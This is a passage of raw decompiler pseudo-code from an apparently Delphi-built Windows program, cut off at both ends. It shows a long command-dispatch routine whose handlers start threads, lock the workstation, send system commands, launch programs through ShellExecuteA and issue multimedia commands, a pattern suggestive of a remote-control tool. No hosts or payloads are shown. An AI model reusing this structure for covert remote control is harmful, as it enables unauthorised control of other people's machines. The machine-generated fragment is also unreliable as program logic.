var_14h;\n        var_430h = 0x47db4c;\n        var_434h = 0x478ec0;\n        fcn.004058e0();\n        var_434h = 0x478ed1;\n        fcn.0046ff10();\n    }\n    var_434h = 0x478ede;\n    fcn.00405974();\n    if (uVar11) {\n        var_434h = 0x478ee5;\n        fcn.0046fff0();\n    }\n    var_434h = &fcn.004760a4::var_45ch;\n    var_438h = 0x478efe;\n    fcn.00405a44();\n    var_438h = 0x478f0e;\n    fcn.00405974();\n    if (uVar11) {\n        var_438h = 0x478f26;\n        fcn.00405a84();\n        var_438h = &fcn.004760a4::var_ch;\n        var_43ch = 0x478f37;\n        fcn.00405b28();\n        var_43ch = 0x478f47;\n        fcn.00405a44();\n        var_43ch = 0x478f54;\n        fcn.00405b28();\n        var_43ch = 0x478f63;\n        fcn.00405a84();\n        var_43ch = &fcn.004760a4::var_10h;\n        var_440h = 0x478f74;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_440h = 0x478f84;\n        fcn.00405a44();\n        var_440h = 0x478f91;\n        fcn.00405b28();\n        var_440h = 0x478fa0;\n        fcn.00405a84();\n        var_440h = 0x478fab;\n        fcn.004055c8();\n        var_440h = var_10h;\n        var_444h = 0x478fbf;\n        fcn.00484fc0(var_10h);\n    }\n    var_444h = 0x478fcc;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x2;\n        var_448h = 0x478fe0;\n        fcn.0045eac4();\n        var_448h = var_460h;\n        var_44ch = 0x478fec;\n        (**(*var_460h + 0x74))();\n        var_444h = 0x478ff1;\n        fcn.0040711c();\n    }\n    var_444h = 0x478ffe;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0xa;\n        var_448h = 0x479012;\n        fcn.0045eac4();\n        var_448h = var_464h;\n        var_44ch = 0x47901e;\n        (**(*var_464h + 0x74))();\n        var_444h = 0x479023;\n        fcn.0040711c();\n    }\n    var_444h = 0x479030;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x22;\n        var_448h = 0x479044;\n        fcn.0045eac4();\n        var_448h = var_468h;\n        var_44ch = 0x479050;\n        (**(*var_468h + 0x74))();\n        var_444h = 0x479055;\n        fcn.0040711c();\n    }\n    var_444h = 0x479062;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x1;\n        var_448h = 0x479076;\n        fcn.0045eac4();\n        var_448h = var_46ch;\n        var_44ch = 0x479082;\n        (**(*var_46ch + 0x74))();\n        var_444h = 0x479087;\n        fcn.0040711c();\n    }\n    var_444h = 0x479094;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x4790a6;\n        fcn.0045eac4();\n        var_444h = var_470h;\n        var_448h = 0x4790b2;\n        (**(*var_470h + 0x3c))();\n        var_444h = 0x4790b7;\n        fcn.0040711c();\n    }\n    var_444h = 0x4790c4;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x4790d5;\n        var_444h = fcn.00405d28();\n        var_448h = 0x4790e6;\n        fcn.0045eac4();\n        var_448h = var_478h;\n        var_44ch = 0x4790f5;\n        (**(*var_478h + 0x90))();\n        var_44ch = 0x4790fa;\n        fcn.0040711c();\n        var_44ch = 0x479108;\n        fcn.004057d4();\n        var_44ch = 0x479113;\n        var_44ch = fcn.00405d28();\n        var_450h = 0x479124;\n        fcn.0045eac4();\n        var_450h = var_480h;\n        var_454h = 0x479130;\n        (**(*var_480h + 0x24))();\n        var_454h = 0x479135;\n        fcn.0040711c();\n        var_454h = 0x479143;\n        fcn.004057d4();\n        var_454h = 0x479148;\n        cVar1 = fcn.004700d8();\n        if (cVar1 == '\\x01') {\n            var_454h = 0x479157;\n            var_454h = fcn.00405d28();\n            var_458h = 0x479168;\n            fcn.0045eac4();\n            var_458h = var_488h;\n            var_45ch = 0x479174;\n            (**(*var_488h + 0x6c))();\n            var_454h = 0x479179;\n            fcn.0040711c();\n            var_454h = 0x479187;\n            fcn.004057d4();\n        }\n        var_454h = 0x47918c;\n        cVar1 = fcn.004700d8();\n        if (cVar1 == '\\x01') {\n            var_454h = 0x47919b;\n            var_454h = fcn.00405d28();\n            var_458h = 0x4791ac;\n            fcn.0045eac4();\n            var_458h = var_490h;\n            var_45ch = 0x4791b8;\n            (**(*var_490h + 0x70))();\n            var_454h = 0x4791bd;\n            fcn.0040711c();\n            var_454h = 0x4791cb;\n            fcn.004057d4();\n        }\n        var_454h = 0x4791d6;\n        var_454h = fcn.00405d28();\n        var_458h = 0x4791e7;\n        fcn.0045eac4();\n        var_458h = var_498h;\n        var_45ch = 0x4791f6;\n        (**(*var_498h + 0x80))();\n        var_414h = 0x4791fb;\n        fcn.0040711c();\n        var_414h = 0x479209;\n        fcn.004057d4();\n        if (var_ch == NULL) {\n            var_414h = 0x47921c;\n            fcn.004055c8();\n        }\n        if (var_10h == NULL) {\n            var_414h = 0x47922f;\n            fcn.004055c8();\n        }\n        if (var_14h == 0) {\n            var_414h = 0x479242;\n            fcn.004055c8();\n        }\n        if (var_18h == 0) {\n            var_414h = 0x479255;\n            fcn.004055c8();\n        }\n        uVar11 = var_1ch == NULL;\n        if (uVar11) {\n            var_414h = 0x479268;\n            fcn.004055c8();\n        }\n        var_414h = 0x47dc0c;\n        var_418h = var_ch;\n        var_41ch = 0x47d2ec;\n        var_420h = var_10h;\n        var_424h = 0x47d2ec;\n        var_428h = var_14h;\n        var_42ch = 0x47d2ec;\n        var_430h = var_18h;\n        var_434h = 0x47d2ec;\n        var_438h = var_1ch;\n        var_43ch = 0x47d2ec;\n        var_440h = 0x4792a0;\n        fcn.00470178();\n        var_440h = var_4a0h;\n        var_444h = 0x4792b6;\n        fcn.004058e0();\n        var_444h = 0x4792c1;\n        fcn.00475e2c();\n    }\n    var_444h = &fcn.004760a4::var_4a4h;\n    var_448h = 0x4792da;\n    fcn.00405a44();\n    var_448h = 0x4792ea;\n    fcn.00405974();\n    if (uVar11) {\n        var_448h = 0x479302;\n        fcn.00405a84();\n        var_448h = &fcn.004760a4::var_ch;\n        var_44ch = 0x479313;\n        fcn.00405b28();\n        var_44ch = 0x479323;\n        fcn.00405a44();\n        var_44ch = 0x479330;\n        fcn.00405b28();\n        var_44ch = 0x47933f;\n        fcn.00405a84();\n        var_44ch = &fcn.004760a4::var_10h;\n        var_450h = 0x479350;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_450h = 0x479360;\n        fcn.00405a44();\n        var_450h = 0x47936d;\n        fcn.00405b28();\n        var_450h = 0x47937c;\n        fcn.00405a84();\n        var_450h = 0x479387;\n        fcn.004055c8();\n        var_454h = 0x479393;\n        var_450h = &stack0xfffffffc;\n        fcn.004703fc();\n        var_454h = 0x4793a4;\n        fcn.00475fd8(var_450h);\n    }\n    var_450h = &fcn.004760a4::var_4ach;\n    var_454h = 0x4793be;\n    fcn.00405a44();\n    var_454h = 0x4793ce;\n    fcn.00405974();\n    if (uVar11) {\n        var_454h = 0x4793e2;\n        fcn.00405a84();\n        var_454h = 0x4793e7;\n        cVar1 = fcn.004700d8();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_454h = 0x4793f3;\n            fcn.00470784();\n        }\n    }\n    var_454h = &fcn.004760a4::var_4b0h;\n    var_458h = 0x47940c;\n    fcn.00405a44();\n    var_458h = 0x47941c;\n    fcn.00405974();\n    if (uVar11) {\n        var_458h = 0x479430;\n        fcn.00405a84();\n        var_458h = 0x479435;\n        cVar1 = fcn.004700d8();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_458h = 0x479441;\n            fcn.0047037c();\n        }\n    }\n    var_458h = &fcn.004760a4::var_4b4h;\n    var_45ch = 0x47945a;\n    fcn.00405a44();\n    var_45ch = 0x47946a;\n    fcn.00405974();\n    if (uVar11) {\n        var_45ch = 0x47947e;\n        fcn.00405a84();\n        var_45ch = 0x479483;\n        cVar1 = fcn.004700d8();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_45ch = 0x47948f;\n            fcn.004708d0();\n        }\n    }\n    var_45ch = &fcn.004760a4::var_4b8h;\n    var_460h = 0x4794a8;\n    fcn.00405a44();\n    var_460h = 0x4794b8;\n    fcn.00405974();\n    if (uVar11) {\n        var_460h = 0x4794cc;\n        fcn.00405a84();\n        var_460h = 0x4794d1;\n        cVar1 = fcn.004700d8();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_460h = 0x4794dd;\n            fcn.00470a1c();\n        }\n    }\n    var_460h = &fcn.004760a4::var_4bch;\n    var_464h = 0x4794f6;\n    fcn.00405a44();\n    var_464h = 0x479506;\n    fcn.00405974();\n    if (uVar11) {\n        var_464h = 0x47951a;\n        fcn.00405a84();\n        **0x494a84 = 1;\n        var_464h = *0x494b6c;\n        var_468h = 0x479538;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_468h = 0x479548;\n        fcn.00405a44();\n        var_468h = 0x479555;\n        fcn.00405b28();\n        var_468h = 0x479564;\n        fcn.00405a84();\n        var_468h = 0x479571;\n        fcn.00405584();\n    }\n    var_468h = 0x47957e;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        **0x494a84 = 0;\n    }\n    var_468h = &fcn.004760a4::var_4c0h;\n    var_46ch = 0x4795a2;\n    fcn.00405a44();\n    var_46ch = 0x4795b2;\n    fcn.00405974();\n    if (uVar11) {\n        var_46ch = 0x4795ca;\n        fcn.00405a84();\n        if (**0x4948f4 == 1) {\n            var_46ch = 0x4795de;\n            fcn.00475e2c();\n        }\n        var_46ch = &fcn.004760a4::var_ch;\n        var_470h = 0x4795ef;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_470h = 0x4795ff;\n        fcn.00405a44();\n        var_470h = 0x47960c;\n        fcn.00405b28();\n        var_470h = 0x47961b;\n        fcn.00405a84();\n        var_470h = 0x479626;\n        fcn.004055c8();\n        var_474h = 0x479637;\n        var_470h = &stack0xfffffffc;\n        fcn.0048adcc();\n        var_474h = 0x479647;\n        fcn.00405818();\n        var_474h = 0x479658;\n        fcn.00480e44();\n        var_474h = 0x479669;\n        fcn.00475fd8(var_470h);\n    }\n    var_470h = 0x479677;\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x4948f4 == 1,  !uVar11)) {\n        var_470h = &fcn.004760a4::var_4h;\n        var_474h = NULL;\n        var_478h = NULL;\n        var_47ch = 0x482028;\n        var_480h = NULL;\n        var_484h = NULL;\n        var_488h = 0x479699;\n        sub.kernel32.dll_CreateThread_1();\n        **0x4948f4 = 1;\n    }\n    var_470h = 0x4796b1;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        **0x4948f4 = 0;\n    }\n    var_470h = 0x4796c9;\n    fcn.00405974();\n    if (uVar11) {\n        **0x494a84 = 1;\n    }\n    var_470h = 0x4796e3;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        **0x494a84 = 0;\n    }\n    var_470h = &fcn.004760a4::var_4cch;\n    var_474h = 0x479707;\n    fcn.00405a44();\n    var_474h = 0x479717;\n    fcn.00405974();\n    if (uVar11) {\n        var_474h = 0x47972f;\n        fcn.00405a84();\n        var_474h = &fcn.004760a4::var_ch;\n        var_478h = 0x479740;\n        fcn.00405b28();\n        var_478h = 0x479750;\n        fcn.00405a44();\n        var_478h = 0x47975d;\n        fcn.00405b28();\n        var_478h = 0x47976c;\n        fcn.00405a84();\n        var_478h = &fcn.004760a4::var_10h;\n        var_47ch = 0x47977d;\n        fcn.00405b28();\n        var_47ch = 0x47978d;\n        fcn.00405a44();\n        var_47ch = 0x47979a;\n        fcn.00405b28();\n        var_47ch = 0x4797a9;\n        fcn.00405a84();\n        var_47ch = 0x4797b4;\n        fcn.004055c8();\n        var_47ch = 0x4797c4;\n        fcn.0048adcc();\n        var_47ch = var_4d4h;\n        var_480h = 0x47dcf4;\n        var_484h = var_ch;\n        var_488h = 0x4797e2;\n        fcn.004058e0();\n        var_488h = 0x4797ed;\n        cVar1 = fcn.0040a26c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = var_484h;\n            goto code_r0x0047d148;\n        }\n        var_48ch = 0x47980f;\n        var_488h = &stack0xfffffffc;\n        fcn.0048adcc();\n        var_48ch = var_4e0h;\n        var_490h = 0x47dcf4;\n        var_494h = var_ch;\n        var_498h = 0x47982d;\n        fcn.004058e0();\n        var_498h = 0x47983e;\n        fcn.0048aab0();\n        var_498h = 0x47984f;\n        fcn.00475fd8(var_494h);\n    }\n    var_494h = 0x47985d;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x479869;\n        fcn.0048a070();\n    }\n    var_494h = 0x479876;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x479882;\n        fcn.0048a070();\n    }\n    var_494h = 0x47988f;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x47989b;\n        fcn.0048a070();\n    }\n    var_494h = 0x4798a8;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x4798b4;\n        fcn.0048a070();\n    }\n    var_494h = 0x4798c1;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = NULL;\n        var_498h = 0xf140;\n        var_49ch = 0x112;\n        var_4a0h = NULL;\n        var_4a4h = 0x4798d6;\n        sub.user32.dll_SendMessageA();\n    }\n    var_494h = 0x4798e3;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x4798ea;\n        sub.user32.dll_LockWorkStation();\n    }\n    var_494h = &fcn.004760a4::var_4e4h;\n    var_498h = 0x479903;\n    fcn.00405a44();\n    var_498h = 0x479913;\n    fcn.00405974();\n    if (uVar11) {\n        var_498h = 0x47992b;\n        fcn.00405a84();\n        var_498h = &fcn.004760a4::var_10h;\n        var_49ch = 0x47993c;\n        fcn.00405b28();\n        var_49ch = 0x47994c;\n        fcn.00405a44();\n        var_49ch = 0x479959;\n        fcn.00405b28();\n        var_49ch = 0x479968;\n        fcn.00405a84();\n        var_49ch = &fcn.004760a4::var_14h;\n        var_4a0h = 0x479979;\n        fcn.00405b28();\n        var_4a0h = 0x479989;\n        fcn.00405a44();\n        var_4a0h = 0x479996;\n        fcn.00405b28();\n        var_4a0h = 0x4799a5;\n        fcn.00405a84();\n        var_4a0h = 0x4799b0;\n        fcn.004055c8();\n        var_4a0h = 0x4799c3;\n        fcn.00405728();\n        var_4a0h = var_4e8h;\n        var_4a4h = 0x47d720;\n        var_4a8h = 0x4799e1;\n        fcn.00409d70();\n        var_4a8h = var_4ech;\n        var_4ach = 0x47d720;\n        var_4b0h = 0x4799f7;\n        fcn.0048d6a4();\n        var_4b0h = var_4f0h;\n        var_4b4h = 0x47d720;\n        var_4b8h = 0x479a0d;\n        fcn.0048ceb0();\n        var_4b8h = var_4f4h;\n        var_4bch = 0x47d5dc;\n        var_4c0h = 0x479a23;\n        fcn.0048ce74();\n        var_4c0h = var_4f8h;\n        var_4c4h = 0x47d720;\n        var_4c8h = 0x479a39;\n        fcn.0048d3c4();\n        var_4c8h = var_4fch;\n        var_4cch = 0x47d720;\n        var_4d0h = 0x479a4f;\n        fcn.0046d2ec();\n        var_4d0h = var_500h;\n        var_4d4h = 0x47d720;\n        var_4d8h = 0x47de30;\n        var_4dch = 0x47d720;\n        var_4e0h = 0x479a6f;\n        fcn.0048cf38();\n        var_4e0h = var_504h;\n        var_4e4h = 0x47d720;\n        var_4e8h = 0x479a85;\n        fcn.0048d1f4();\n        var_4e8h = var_508h;\n        var_4ech = 0x47d720;\n        var_4f0h = 0x479a9b;\n        fcn.0048d248();\n        var_4f0h = var_50ch;\n        var_4f4h = 0x47d720;\n        var_4f8h = 0x479ab1;\n        fcn.0048d298();\n        var_4f8h = var_510h;\n        var_4fch = 0x47d720;\n        var_500h = 0x479ac7;\n        fcn.0048d2fc();\n        var_500h = var_514h;\n        var_504h = 0x47d720;\n        var_508h = 0x479add;\n        fcn.0048d6d4();\n        var_508h = var_518h;\n        var_50ch = 0x47d720;\n        var_510h = 0x479af3;\n        fcn.0048d704();\n        var_510h = var_51ch;\n        var_514h = 0x47d720;\n        var_518h = 0x479b09;\n        fcn.0048d9b0();\n        var_518h = var_520h;\n        var_51ch = 0x47d720;\n        var_520h = 0x479b1f;\n        fcn.0046d9e0();\n        var_520h = 0x479b30;\n        fcn.0048da48();\n        var_520h = var_524h;\n        var_524h = 0x47d720;\n        uVar11 = 1;\n        var_528h = 0x479b48;\n        fcn.0040f234();\n        var_528h = var_52ch;\n        var_52ch = 0x47d720;\n        var_530h = **0x494d38;\n        var_534h = 0x47d720;\n        var_538h = **0x494910;\n        var_53ch = 0x47d720;\n        var_540h = 0x479b7b;\n        fcn.004735e8();\n        var_540h = 0x479b8c;\n        fcn.0048bbdc();\n        var_540h = var_530h;\n        var_544h = 0x47d720;\n        var_548h = 0x479ba2;\n        fcn.0048bc6c();\n        var_548h = var_538h;\n        var_54ch = 0x47d720;\n        var_550h = 0x479bb8;\n        fcn.0048cbc4();\n        var_550h = var_53ch;\n        var_554h = 0x479bcb;\n        fcn.004058e0();\n        var_558h = 0x479bda;\n        var_554h = &stack0xfffffffc;\n        fcn.00475fd8(&stack0xfffffffc);\n    }\n    var_554h = &fcn.004760a4::var_540h;\n    var_558h = 0x479bf4;\n    fcn.00405a44();\n    var_558h = 0x479c04;\n    fcn.00405974();\n    if (uVar11) {\n        var_558h = 0x479c1c;\n        fcn.00405a84();\n        var_558h = 0x479c27;\n        fcn.004055c8();\n        uVar11 = **0x494900 == 0;\n        if (!uVar11) {\n            var_558h = 0x479c3d;\n            cVar1 = fcn.00485da0();\n            uVar11 = cVar1 == '\\0';\n            if (!uVar11) {\n                *in_FS_OFFSET = var_554h;\n                goto code_r0x0047d148;\n            }\n        }\n        var_558h = 0x479c5c;\n        iVar4 = fcn.0041fa34();\n        **0x494900 = iVar4;\n        *(**0x494900 + 0xf) = 1;\n        var_558h = 0x479c7d;\n        fcn.0041fc40();\n        var_558h = 0x479c85;\n        fcn.00409edc();\n        var_558h = 0x479c93;\n        fcn.00485d50();\n        var_558h = 0x479ca4;\n        fcn.00485d54();\n        var_558h = 0x479cb0;\n        fcn.0041fef0();\n    }\n    var_558h = &fcn.004760a4::var_544h;\n    var_55ch = 0x479cc9;\n    fcn.00405a44();\n    var_55ch = 0x479cd9;\n    fcn.00405974();\n    if (uVar11) {\n        var_55ch = 0x479ced;\n        fcn.00405a84();\n        var_55ch = 5;\n        var_560h = 0;\n        var_564h = 0;\n        var_568h = 0x479cfb;\n        var_568h = fcn.004059dc();\n        var_56ch = 0x47d3d4;\n        var_570h = 0;\n        var_574h = 0x479d08;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    var_574h = &fcn.004760a4::var_548h;\n    var_578h = 0x479d21;\n    fcn.00405a44();\n    var_578h = 0x479d31;\n    fcn.00405974();\n    if (uVar11) {\n        var_578h = 0x479d45;\n        fcn.00405a84();\n        var_578h = 0x479d50;\n        fcn.00489bb0();\n        var_578h = 0x479d60;\n        fcn.00405818();\n        var_578h = 0x479d6e;\n        fcn.0048ab58();\n        var_578h = 0;\n        var_57ch = 0;\n        var_580h = 0;\n        var_584h = 0x479d7f;\n        fcn.00489bb0();\n        var_584h = 0x479d8f;\n        fcn.00405818();\n        var_584h = 0x479d9a;\n        var_584h = fcn.004059dc();\n        var_588h = 0x47dea0;\n        var_58ch = 0;\n        var_590h = 0x479da7;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    var_590h = 0x479db4;\n    fcn.00405974();\n    if (uVar11) {\n        var_590h = 0x479dc5;\n        fcn.00470b68();\n        if (var_554h != NULL) {\n            var_590h = 0x479dd9;\n            fcn.00470b68();\n            var_590h = 0x479def;\n            fcn.00405864();\n            var_590h = 0x479dfa;\n            fcn.00475e2c();\n        }\n        var_590h = 0x479e05;\n        fcn.00470b94();\n        uVar11 = var_560h == 0;\n        if (!uVar11) {\n            var_590h = 0x479e19;\n            fcn.00470b94();\n            var_590h = 0x479e2f;\n            fcn.00405864();\n            var_590h = 0x479e3a;\n            fcn.00475e2c();\n        }\n    }\n    var_590h = 0x479e47;\n    fcn.00405974();\n    if (uVar11) {\n        var_590h = 0x479e54;\n        fcn.00470b68();\n        var_590h = 0x479e6a;\n        fcn.00405864();\n        var_590h = 0x479e75;\n        fcn.00475e2c();\n    }\n    var_590h = &fcn.004760a4::var_574h;\n    var_594h = 0x479e8e;\n    fcn.00405a44();\n    var_594h = 0x479e9e;\n    fcn.00405974();\n    if (uVar11) {\n        var_594h = 0x479eb2;\n        fcn.00405a84();\n        var_594h = *0x47d2f0;\n        var_598h = &fcn.004760a4::var_578h;\n        var_59ch = 0x479ed3;\n        fcn.0040ef44(var_598h, var_594h);\n        var_59ch = 0x479ee1;\n        fcn.004055c8();\n        var_59ch = 0x479ee6;\n        fcn.00431a7c();\n        var_59ch = 0x479eee;\n        fcn.00431604();\n    }\n    var_59ch = 0x479efb;\n    fcn.00405974();\n    if (uVar11) {\n        var_59ch = 0x479f02;\n        piVar8 = fcn.00431a7c();\n        var_59ch = 0x479f07;\n        (**(*piVar8 + 0x10))();\n    }\n    var_59ch = &fcn.004760a4::var_57ch;\n    puStack1444 = 0x479f20;\n    fcn.00405a44();\n    puStack1444 = 0x479f30;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1444 = 0x479f48;\n        fcn.00405a84();\n        puStack1444 = &fcn.004760a4::var_ch;\n        puStack1448 = 0x479f59;\n        fcn.00405b28();\n        puStack1448 = 0x479f69;\n        fcn.00405a44();\n        puStack1448 = 0x479f76;\n        fcn.00405b28();\n        puStack1448 = 0x479f85;\n        fcn.00405a84();\n        puStack1448 = &fcn.004760a4::var_10h;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00470d2c();\n        fcn.00475fd8(arg_8h_01);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        sub.ole32.dll_CoInitialize();\n        iVar4 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffa48;\n        puStack1468 = 0x47a01e;\n        fcn.00464f98();\n        puStack1468 = 0x47a02f;\n        fcn.00409b7c();\n        if (var_584h != 0) {\n            puStack1468 = 0x47a043;\n            fcn.00464f98();\n            puStack1468 = 0x47a059;\n            fcn.00405864();\n            puStack1468 = 0x47a064;\n            fcn.00475e2c();\n        }\n        *in_FS_OFFSET = iVar4;\n        sub.ole32.dll_CoUninitialize();\n        return;\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puStack1460 = &fcn.004760a4::var_10h;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack1468 = 0x47a150;\n        fcn.0048ac14();\n        puStack1468 = 0x47a161;\n        fcn.00475fd8(arg_8h_00);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dc28();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dc4c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046da50();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dab4();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046db18();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046db5c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dba0();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dbe4();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.004710a0();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00471078();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.004710f0();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.004710f0();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.00471010();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00471010();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00470ed4();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.00470ed4();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.004710c8();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        puStack1468 = NULL;\n        puStack1472 = NULL;\n        puStack1476 = 0x47e150;\n        uStack1480 = 0x47a2e1;\n        sub.winmm.dll_mciSendStringA();\n    }\n    puStack1468 = 0x47a2fa;\n    fcn.00405a44();\n    puStack1468 = 0x47a30a;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1468 = 0x47a31e;\n        fcn.00405a84();\n        puStack1468 = 0x47a32c;\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        puStack1468 = 0x47a33b;\n        fcn.0041fc40();\n        uVar11 = 1;\n        puStack1468 = 0x47a344;\n        fcn.00485d50();\n        puStack1468 = 0x47a34e;\n        fcn.00485da8();\n        puStack1468 = 0x47a35a;\n        fcn.00485d54();\n        puStack1468 = 0x47a361;\n        fcn.0041fef0();\n    }\n    puStack1468 = &stack0xfffffa5c;\n    puStack1472 = 0x47a37a;\n    fcn.00405a44();\n    puStack1472 = 0x47a38a;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1472 = 0x47a39e;\n        fcn.00405a84();\n        puStack1472 = 0x47a3ab;\n        fcn.00405974();\n        if (uVar11) {\n            puStack1472 = 0x47a3b4;\n            fcn.00475bd8();\n        }\n        else {\n            uVar11 = 1;\n            puStack1472 = 0x47a3bd;\n            fcn.00475bd8();\n        }\n    }\n    puStack1472 = &stack0xfffffa58;\n    puStack1476 = 0x47a3d6;\n    fcn.00405a44();\n    puStack1476 = 0x47a3e6;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1476 = 0x47a3fa;\n        fcn.00405a84();\n        puStack1476 = 0x47a408;\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        puStack1476 = 0x47a417;\n        fcn.0041fc40();\n        puStack1476 = 0x47a422;\n        fcn.00484ee8();\n        puStack1476 = 0x47a435;\n        fcn.00405864();\n        puStack1476 = 0x47a442;\n        fcn.00484f08();\n        puStack1476 = 0x47a44e;\n        fcn.00484f74();\n        puStack1476 = 0x47a455;\n        fcn.0041fef0();\n    }\n    puStack1476 = 0x47a462;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1476 = 0x47a47c;\n        fcn.00405864();\n        puStack1476 = 0x47a487;\n        fcn.00475e2c();\n    }\n    puStack1476 = 0x47a494;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1476 = 0x47a4a1;\n        fcn.00470b68();\n        uVar11 = puStack1460 == NULL;\n        if (!uVar11) {\n            puStack1476 = 0x47a4b5;\n            fcn.00470b68();\n            puStack1476 = 0x47a4cb;\n            fcn.00405864();\n            puStack1476 = 0x47a4d6;\n            fcn.00475e2c();\n        }\n    }\n    puStack1476 = &stack0xfffffa40;\n    uStack1480 = 0x47a4ef;\n    fcn.00405a44();\n    uStack1480 = 0x47a4ff;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1480 = 0x47a513;\n        fcn.00405a84();\n        uStack1480 = 0x47a518;\n        fcn.00431a7c();\n        uStack1480 = 0x47a520;\n        fcn.00431604();\n    }\n    uStack1480 = 0x47a52d;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1480 = 5;\n        uStack1484 = 0;\n        uStack1488 = 0;\n        uStack1492 = 0x47e228;\n        uStack1496 = 0x47d3d4;\n        uStack1500 = 0;\n        var_5dch = 0x47a546;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    var_5dch = 0x47a553;\n    fcn.00405974();\n    if (uVar11) {\n        var_5dch = 0x47a55c;\n        fcn.0048b1a0();\n    }\n    var_5dch = 0x47a569;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        var_5dch = 0x47a572;\n        fcn.0048b1a0();\n    }\n    var_5dch = &stack0xfffffa3c;\n    puStack1508 = 0x47a58b;\n    fcn.00405a44();\n    puStack1508 = 0x47a59b;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1508 = 0x47a5af;\n        fcn.00405a84();\n        puStack1508 = 0x47a5bd;\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        puStack1508 = 0x47a5cc;\n        fcn.0041fc40();\n        uVar11 = 1;\n        puStack1508 = 0x47a5d5;\n        fcn.00485d50();\n        puStack1508 = 0x47a5df;\n        fcn.00485da8();\n        puStack1508 = 0x47a5eb;\n        fcn.00485d54();\n        puStack1508 = 0x47a5f2;\n        fcn.0041fef0();\n    }\n    puStack1508 = &stack0xfffffa38;\n    puStack1512 = 0x47a60b;\n    fcn.00405a44();\n    puStack1512 = 0x47a61b;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1512 = 0x47a633;\n        fcn.00405a84();\n        puStack1512 = &fcn.004760a4::var_ch;\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack1524 = 0x47a6c4;\n        fcn.0046f6e0();\n        puStack1524 = 0x47a6d5;\n        fcn.00475fd8(puVar14);\n    }\n    puVar14 = &stack0xfffffa30;\n    puStack1524 = 0x47a6ef;\n    fcn.00405a44();\n    puStack1524 = 0x47a6ff;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1524 = 